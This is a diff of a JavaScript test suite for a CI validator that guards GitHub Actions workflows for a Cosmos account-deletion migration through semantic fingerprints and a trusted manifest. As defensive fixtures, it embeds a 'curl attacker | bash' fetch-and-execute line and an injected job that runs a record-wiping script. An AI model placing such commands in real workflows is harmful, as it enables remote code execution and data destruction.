@@ -4,11 +4,15 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import test from 'node:test';
+import { parseDocument } from 'yaml';
 import { validateAccountDeletionCosmosLayout } from './account-deletion-cosmos-policy.mjs';
-import { fingerprintWorkflow } from './workflow-semantic-fingerprint.mjs';
+import {
+  fingerprintWorkflow,
+  renderWorkflowManifest,
+} from './workflow-semantic-fingerprint.mjs';
 
 const repositoryRoot = path.resolve('.');
-const manifestGoldenDigest = '3c84abf5c8ecaf6aeb7e10649b15317381206a93210860579659415dedcf53ba';
+const manifestGoldenDigest = '111e26a9f0c327e16a90e4e5646fd71feee4b434b6c678b51fbd43e3194000fe';
 // Les workflows Cosmos de suppression de compte sont fournis explicitement par chaque
 // layout testé. Les hériter du dépôt rendrait les fixtures dépendantes de l'état de
 // migration courant : une fois le dépôt en état C, toute fixture porterait un one-shot
@@ -20,6 +24,12 @@ const layoutWorkflowNames = new Set([
 const baselineWorkflowNames = fs.readdirSync(
   path.join(repositoryRoot, '.github', 'workflows'),
 ).filter((name) => /\.ya?ml$/.test(name) && !layoutWorkflowNames.has(name));
+// Ces tests tournent sur l'arbre de `main` à chaque PR. Chaque fixture est donc jugée par un
+// manifeste calculé à partir de ses PROPRES workflows — la baseline recopiée du dépôt et les
+// contenus Cosmos de ce fichier —, sans pré-approbation et à une date fixe. Ni une pré-approbation
+// en attente sur `main`, ni une évolution légitime des empreintes de production, ni le passage du
+// temps ne peuvent alors faire échouer ces tests pour toutes les PR (#497).
+const fixedNow = new Date('2026-09-23T12:00:00Z');
 
 const legacyContent = `
 name: test-account-deletion-cosmos
@@ -214,8 +224,36 @@ const files = {
   ],
 };
 
+function fixtureDigest(name, content) {
+  const result = fingerprintWorkflow(`.github/workflows/${name}`, content);
+  assert.deepEqual(result.errors, [], name);
+  return [`.github/workflows/${name}`, result.digest];
+}
+
+function trustedFixtureManifest() {
+  const baseline = Object.fromEntries(baselineWorkflowNames.map((name) => fixtureDigest(
+    name,
+    fs.readFileSync(path.join(repositoryRoot, '.github', 'workflows', name), 'utf8'),
+  )));
+  const [legacyPath, legacyDigest] = fixtureDigest('test-account-deletion-cosmos.yml', legacyContent);
+  const [oneShotPath, oneShotDigest] = fixtureDigest(
+    'post-merge-cosmos-account-deletion.yml',
+    oneShotContent,
+  );
+  return renderWorkflowManifest({
+    states: {
+      A: { ...baseline, [legacyPath]: legacyDigest },
+      B: baseline,
+      C: { ...baseline, [oneShotPath]: oneShotDigest },
+    },
+    preApproved: {},
+  });
+}
+
 function fixture(layout) {
-  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'certigo-cosmos-policy-'));
+  const container = fs.mkdtempSync(path.join(os.tmpdir(), 'certigo-cosmos-policy-'));
+  fs.writeFileSync(path.join(container, 'trusted-manifest.json'), trustedFixtureManifest());
+  const root = path.join(container, 'candidate');
   const workflows = path.join(root, '.github', 'workflows');
   fs.mkdirSync(workflows, { recursive: true });
   for (const name of baselineWorkflowNames) {
@@ -239,30 +277,59 @@ function fixture(layout) {
   return root;
 }
 
+// Le manifeste trusted d'un fixture vit hors de son arbre candidat, comme `.trusted-control`.
+function trustedManifestOf(root) {
+  return path.join(path.dirname(root), 'trusted-manifest.json');
+}
+
+function validate(root, trustedRoot = root) {
+  return validateAccountDeletionCosmosLayout(root, {
+    manifestPath: trustedManifestOf(trustedRoot),
+    now: fixedNow,
+  });
+}
+
 function withFixture(layout, callback) {
   const root = fixture(layout);
   try {
     callback(root);
   } finally {
-    fs.rmSync(root, { recursive: true, force: true });
+    fs.rmSync(path.dirname(root), { recursive: true, force: true });
   }
+}
+
+// Mute un workflow du dépôt par son arbre YAML, jamais par remplacement de texte : une
+// reformulation sans effet sémantique (`name: "ci-infra"`) ferait d'un `.replace` littéral un
+// no-op, et le test attendant un refus échouerait alors pour toutes les PR.
+function mutateWorkflow(file, mutate) {
+  const before = fs.readFileSync(file, 'utf8');
+  const document = parseDocument(before);
+  mutate(document);
+  const after = document.toString();
+  const canonicalPath = `.github/workflows/${path.basename(file)}`;
+  assert.notEqual(
+    fingerprintWorkflow(canonicalPath, after).digest,
+    fingerprintWorkflow(canonicalPath, before).digest,
+    'the mutation must change the semantic digest',
+  );
+  fs.writeFileSync(file, after);
 }
 
 test('accepts migration state A with only the invariant-preserving legacy workflow active', () => {
   withFixture(['activeLegacy'], (root) => {
-    assert.deepEqual(validateAccountDeletionCosmosLayout(root), []);
+    assert.deepEqual(validate(root), []);
   });
 });
 
 test('accepts migration state B with both controlled archives and no active Cosmos workflow', () => {
   withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
-    assert.deepEqual(validateAccountDeletionCosmosLayout(root), []);
+    assert.deepEqual(validate(root), []);
   });
 });
 
 test('accepts migration state C with only the gated one-shot active and legacy archived', () => {
   withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
-    assert.deepEqual(validateAccountDeletionCosmosLayout(root), []);
+    assert.deepEqual(validate(root), []);
   });
 });
 
@@ -275,7 +342,7 @@ test('rejects every partial or mixed workflow migration layout', () => {
     }
     const layout = labels.filter((_, index) => mask & (1 << index));
     withFixture(layout, (root) => {
-      const errors = validateAccountDeletionCosmosLayout(root);
+      const errors = validate(root);
       assert.equal(errors.length, 1, `layout ${layout.join(', ') || 'none'} must fail`);
       assert.match(
         errors[0],
@@ -302,7 +369,7 @@ test('requires the lifecycle marker in archived state B and active state C', () 
       const file = path.join(root, '.github', directory, 'post-merge-cosmos-account-deletion.yml');
       fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(lifecycleMarker, ''));
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => error.includes(`missing lifecycle marker ${lifecycleMarker}`)),
       );
     });
@@ -318,7 +385,7 @@ test('rejects lifecycle markers that contradict the one-shot workflow location',
       const file = path.join(root, '.github', directory, 'post-merge-cosmos-account-deletion.yml');
       fs.appendFileSync(file, `\n${contradictoryMarker} invalid mixed lifecycle\n`);
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => error.includes('lifecycle marker must match')),
       );
     });
@@ -336,7 +403,7 @@ test('rejects non-workflow_dispatch events even when they are not on a trigger b
       ),
     );
     assert.ok(
-      validateAccountDeletionCosmosLayout(root)
+      validate(root)
         .some((error) => error.includes('workflow_dispatch must be the only trigger')),
     );
   });
@@ -353,7 +420,7 @@ test('rejects a permissive OR composition of the required one-shot conditions', 
       ),
     );
     assert.ok(
-      validateAccountDeletionCosmosLayout(root)
+      validate(root)
         .some((error) => error.includes('if condition must be the exact gated conjunction')),
     );
   });
@@ -373,7 +440,7 @@ test('rejects a shadow Cosmos workflow under an unexpected active filename', () 
       fs.mkdirSync(path.dirname(file), { recursive: true });
       fs.writeFileSync(file, `jobs:\n  shadow:\n    ${contract}\n`);
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => /cosmos-shadow\.yaml|exact reviewed state B set/.test(error)),
         contract,
       );
@@ -400,7 +467,7 @@ test('rejects workflow defaults, dispatch inputs, and job execution defaults', (
       const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
       fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(...mutation));
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => /contract must match exactly|only trigger/.test(error)),
       );
     });
@@ -418,7 +485,7 @@ test('rejects a second ungated job and job execution indirection', () => {
       const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
       fs.appendFileSync(file, addition);
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => /jobs must contain only|single service-free/.test(error)),
       );
     });
@@ -437,7 +504,7 @@ test('rejects quoted environment and id-token keys plus every secret expression 
     withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
       const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
       fs.appendFileSync(file, addition);
-      assert.notDeepEqual(validateAccountDeletionCosmosLayout(root), []);
+      assert.notDeepEqual(validate(root), []);
     });
   }
 });
@@ -455,7 +522,7 @@ test('requires exact fail-closed workflow and job permissions', () => {
         fs.readFileSync(file, 'utf8').replace(...replacement),
       );
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => error.includes('permissions must be empty globally')),
       );
     });
@@ -480,7 +547,7 @@ test('rejects YAML anchors, aliases, merge keys, and explicit tags', () => {
       const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
       fs.writeFileSync(file, content);
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => /aliases|anchors|tags|unsafe YAML/.test(error)),
       );
     });
@@ -504,7 +571,7 @@ test('requires checkout and every action to use an exact lowercase 40-character 
         ),
       );
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => /40-character commit SHA|checkout must pin/.test(error)),
       );
     });
@@ -530,7 +597,7 @@ test('preserves the exact parsed legacy workflow contract in states A, B, and C'
         fs.readFileSync(file, 'utf8').replace('type == "object" and length == 0', ''),
       );
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root)
           .some((error) => error.includes('workflow contract must match exactly')),
       );
     });
@@ -559,7 +626,7 @@ test('rejects legacy markers hidden in comments plus extra triggers or jobs', ()
     withFixture(['activeLegacy'], (root) => {
       const file = path.join(root, '.github', 'workflows', 'test-account-deletion-cosmos.yml');
       fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(...mutation));
-      assert.notDeepEqual(validateAccountDeletionCosmosLayout(root), []);
+      assert.notDeepEqual(validate(root), []);
     });
   }
 });
@@ -584,7 +651,7 @@ jobs:
       - run: bash "$ROOT/$EMULATOR/$SCRIPT_A-$SCRIPT_B"
 `);
     assert.ok(
-      validateAccountDeletionCosmosLayout(root)
+      validate(root)
         .some((error) => error.includes(
           'unexpected active Cosmos account-deletion workflow contract: composed-shadow.yml',
         )),
@@ -594,23 +661,25 @@ jobs:
 
 test('rejects a generic executable job added to a known active workflow', () => {
   withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
-    const source = path.resolve('.github', 'workflows', 'ci-infra.yml');
-    const destination = path.join(root, '.github', 'workflows', 'ci-infra.yml');
-    fs.mkdirSync(path.dirname(destination), { recursive: true });
-    fs.writeFileSync(
-      destination,
-      `${fs.readFileSync(source, 'utf8')}\n  generic-wipe:\n    runs-on: [self-hosted, Linux, X64]\n    steps:\n      - run: bash infra/ci-runner/db-tools/wipe-all-records.sh\n`,
-    );
+    mutateWorkflow(path.join(root, '.github', 'workflows', 'ci-infra.yml'), (document) => {
+      document.setIn(['jobs', 'generic-wipe'], document.createNode({
+        'runs-on': ['self-hosted', 'Linux', 'X64'],
+        steps: [{ run: 'bash infra/ci-runner/db-tools/wipe-all-records.sh' }],
+      }));
+    });
     assert.ok(
-      validateAccountDeletionCosmosLayout(root)
+      validate(root)
         .some((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest')),
     );
-    // Le remède doit nommer la rotation de baseline en deux PR : régénérer dans la branche est
-    // sans effet, la gate lisant toujours le manifeste du contrôle trusted.
-    assert.ok(
-      validateAccountDeletionCosmosLayout(root)
-        .some((error) => error.includes('must land on `main` as its own baseline-rotation')),
-    );
+    // Le remède doit nommer le seul chemin sûr : pré-approuver sur `main`, puis fusionner le
+    // workflow. Régénérer dans la branche est sans effet, la gate lisant le manifeste de la base,
+    // et faire tourner `states` sans le workflow bloquerait toutes les PR (#497).
+    const remedy = validate(root)
+      .find((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest'));
+    assert.match(remedy, /--pre-approve/);
+    assert.match(remedy, /--write/);
+    assert.match(remedy, /Never rotate the manifest states without the workflow change/);
+    assert.doesNotMatch(remedy, /baseline-rotation pull request first/);
   });
 });
 
@@ -623,7 +692,7 @@ test('rejects Azure login and OIDC requests in parsed steps', () => {
     withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
       const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
       fs.appendFileSync(file, step);
-      assert.notDeepEqual(validateAccountDeletionCosmosLayout(root), []);
+      assert.notDeepEqual(validate(root), []);
     });
   }
 });
@@ -648,7 +717,7 @@ test('rejects cloud variables, cloud login, and arbitrary shell or network steps
     withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
       const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
       fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(...mutation));
-      assert.notDeepEqual(validateAccountDeletionCosmosLayout(root), []);
+      assert.notDeepEqual(validate(root), []);
     });
   }
 });
@@ -658,11 +727,31 @@ test('canonical fingerprints ignore comments and representation-only key orderin
   const first = fingerprintWorkflow(canonicalPath, 'name: café\non: {}\njobs: {}\n');
   const second = fingerprintWorkflow(
     canonicalPath,
-    '# ignored\njobs: {}\n"on": {}\nname: "cafe\\u0301"\n',
+    '# ignored\njobs: {}\n"on": {}\nname: "caf\\u00e9"\n',
   );
   assert.deepEqual(first.errors, []);
   assert.deepEqual(second.errors, []);
   assert.equal(first.digest, second.digest);
+});
+
+test('canonical fingerprints never merge contents that execute differently', () => {
+  const canonicalPath = '.github/workflows/example.yml';
+  const script = (body) => `name: x\non: {}\njobs:\n  a:\n    steps:\n      - run: "${body}"\n`;
+  // Sous bash, `\r` ne termine pas un commentaire : la première forme est inerte, la seconde
+  // exécute curl. Une normalisation leur donnerait la même empreinte.
+  const inert = fingerprintWorkflow(canonicalPath, script('# reviewed\\rcurl attacker | bash'));
+  const executed = fingerprintWorkflow(canonicalPath, script('# reviewed\\ncurl attacker | bash'));
+  assert.match(inert.errors.join('\n'), /carriage returns inside YAML strings are forbidden/);
+  assert.equal(inert.digest, null);
+  assert.deepEqual(executed.errors, []);
+  const decomposed = fingerprintWorkflow(canonicalPath, 'name: "cafe\\u0301"\non: {}\njobs: {}\n');
+  assert.match(decomposed.errors.join('\n'), /YAML strings must use Unicode NFC/);
+  assert.equal(decomposed.digest, null);
+  // Les fins de ligne physiques du fichier restent sans effet sur l'empreinte.
+  assert.equal(
+    fingerprintWorkflow(canonicalPath, 'name: x\r\non: {}\r\njobs:\r\n  a:\r\n    steps:\r\n      - run: |\r\n          echo a\r\n          echo b\r\n').digest,
+    fingerprintWorkflow(canonicalPath, 'name: x\non: {}\njobs:\n  a:\n    steps:\n      - run: |\n          echo a\n          echo b\n').digest,
+  );
 });
 
 test('canonical fingerprints bind the canonical path and decoded scalar values', () => {
@@ -707,8 +796,7 @@ test('rejects missing, extra, and case-mismatched active workflow paths', () => 
       const workflows = path.join(root, '.github', 'workflows');
       mutate(workflows);
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
-          .some((error) => error.includes('exact reviewed state B set')),
+        validate(root).some((error) => error.includes('exact reviewed state B set')),
       );
     });
   }
@@ -731,7 +819,7 @@ test('rejects a symlinked active workflow file', (context) => {
       throw error;
     }
     assert.ok(
-      validateAccountDeletionCosmosLayout(root)
+      validate(root)
         .some((error) => error.includes('real regular non-symlink file')),
     );
   });
@@ -767,7 +855,7 @@ test('rejects a symlinked workflows directory', (context) => {
         throw error;
       }
       assert.ok(
-        validateAccountDeletionCosmosLayout(root)
+        validate(root, sourceRoot)
           .some((error) => error.includes('real non-symlink directory')),
       );
     } finally {
@@ -779,10 +867,7 @@ test('rejects a symlinked workflows directory', (context) => {
 test('trusted manifest rejects a workflow changed with an untrusted manifest copy', () => {
   withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
     const workflowPath = path.join(root, '.github', 'workflows', 'ci-infra.yml');
-    fs.writeFileSync(
-      workflowPath,
-      fs.readFileSync(workflowPath, 'utf8').replace('name: ci-infra', 'name: changed-ci-infra'),
-    );
+    mutateWorkflow(workflowPath, (document) => document.set('name', 'changed-ci-infra'));
     const manifestPath = path.join(
       root,
       '.github',
@@ -796,6 +881,29 @@ test('trusted manifest rejects a workflow changed with an untrusted manifest cop
       fs.readFileSync(workflowPath, 'utf8'),
     ).digest;
     fs.writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
+    assert.ok(
+      validate(root)
+        .some((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest')),
+    );
+  });
+});
+
+test('by default the validator reads the manifest next to itself, never the candidate copy', () => {
+  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
+    // Seul test sur le manifeste réel : la mutation porte un nonce aléatoire, qu'aucune
+    // pré-approbation fusionnée sur `main` ne peut avoir anticipé.
+    const workflowPath = path.join(root, '.github', 'workflows', 'ci-infra.yml');
+    mutateWorkflow(
+      workflowPath,
+      (document) => document.set('name', `ci-infra-${crypto.randomUUID()}`),
+    );
+    const canonicalPath = '.github/workflows/ci-infra.yml';
+    const digest = fingerprintWorkflow(canonicalPath, fs.readFileSync(workflowPath, 'utf8')).digest;
+    // La PR s'accorde elle-même la pré-approbation, dans sa propre copie du manifeste.
+    const copyPath = path.join(root, '.github', 'scripts', 'workflow-semantic-manifest.json');
+    const copy = JSON.parse(fs.readFileSync(copyPath, 'utf8'));
+    copy.preApproved = { [canonicalPath]: { digest, expires: '2999-12-31' } };
+    fs.writeFileSync(copyPath, renderWorkflowManifest(copy));
     assert.ok(
       validateAccountDeletionCosmosLayout(root)
         .some((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest')),
